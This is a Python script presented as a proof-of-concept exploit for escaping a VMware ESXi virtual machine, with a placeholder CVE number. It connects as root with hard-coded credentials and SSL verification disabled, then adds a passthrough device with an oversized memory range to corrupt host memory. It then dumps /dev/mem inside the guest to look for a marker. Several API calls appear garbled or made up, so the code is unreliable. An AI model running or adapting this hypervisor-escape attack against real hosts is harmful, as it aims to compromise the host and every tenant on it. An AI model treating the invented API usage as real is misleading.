#!/usr/bin/env python3
#
# PoC for VMware ESXi VM escape via memory corruption
# CVE-2023-XXXXX
# Uses python-vmware library to interact with ESXi host
# Needs pip install pyvmomi, requests

import ssl, time, struct
from pyVim.connect import SmartConnect, Disconnect

# Configuration
ESXI_HOST = "esxi.local"
USER = "root"
PWD = "password"
VM_NAME = "vulnerable-vm"

# Payload: overflow a guest PCI window to clobber host memory
OVERFLOW_SIZE = 0x2000
MAGIC_PATTERN = b"EGG!"  # four-byte marker

def connect():
    ctx = ssl._create_unverified_context()
    return SmartConnect(host=ESXI_HOST, user=USER, pwd=PWD, sslContext=ctx)

def find_vm(si):
    content = si.RetrieveContent()
    for datacenter in content.rootFolder.childEntity:
        for vm in datacenter.vmFolder.childEntity:
            if vm.name == VM_NAME:
                return vm
    raise Exception("VM not found")

def trigger_overflow(vm):
    # Create a guest PCI passthrough device with oversized BAR
    spec = {
        "deviceChange": [
            {
                "operation": "add",
                "device": {
                    "key": 0,
                    "busNumber": 0,
                    "slot": 0,
                    "unitNumber": 0,
                    "deviceInfo": {"label": "overflow0", "summary": ""},
                    "backing": {
                        "fileName": "/dev/zero",
                        "pciPassthrough": True
                    },
                    "addressType": "assigned",
                    "resourceAllocation": {
                        "start": 0,
                        "end": OVERFLOW_SIZE,  # triggers out-of-bounds
                        "type": "memory"
                    }
                }
            }
        ]
    }
    vm.ReconfigVM_Task(spec)

def leak_and_verify(vm):
    # Read from the guest's PCI BAR space via guest tools
    sess = vm.vm.guest.authManager.AcquireCredentialsInGuest(
        vm.vm.guest.authManager, USER, PWD, "shell")
    # shell command to dump memory
    cmd = vm.vm.guest.processManager.StartProgramInGuest(
        vm.vm.guest.processManager, sess, {
            "programPath": "/bin/dd",
            "arguments": f"if=/dev/mem bs=1 count={OVERFLOW_SIZE}"
        })
    # wait and capture output, then search for MAGIC_PATTERN
    time.sleep(2)
    output = vm.vm.guest.processManager.ReadJournal(
        vm.vm.guest.processManager, sess, cmd).output
    if MAGIC_PATTERN in output:
        print("[+] Leak succeeded, host memory tainted")
    else:
        print("[-] Failed to find magic pattern")

if __name__ == "__main__":
    si = connect()
    vm = find_vm(si)
    trigger_overflow(vm)
    time.sleep(5)
    leak_and_verify(vm)
    Disconnect(si)